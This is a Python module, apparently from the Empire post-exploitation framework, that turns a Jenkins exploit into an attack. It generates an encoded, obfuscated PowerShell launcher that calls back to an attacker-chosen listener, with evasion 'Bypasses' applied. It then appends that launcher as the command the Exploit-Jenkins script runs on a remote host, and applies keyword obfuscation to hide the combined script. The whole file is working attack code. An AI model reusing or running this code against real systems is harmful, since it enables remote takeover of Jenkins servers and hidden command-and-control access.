from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # Set booleans to false by default
        obfuscate = False

        # extract all of our options
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                       obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                       userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                       bypasses=params['Bypasses'])

        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")
        else:
            #Cmd = launcher
            print(helpers.color("Agent Launcher code: "+ launcher))

        
        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/exploitation/Exploit-Jenkins.ps1"
        if obfuscate:
            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        module_code = f.read()
        f.close()

        script = module_code

        script_end = "\nExploit-Jenkins"
        script_end += " -Rhost "+str(params['Rhost'])
        script_end += " -Port "+str(params['Port'])
        script_end += " -Cmd \"" + launcher + "\""

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
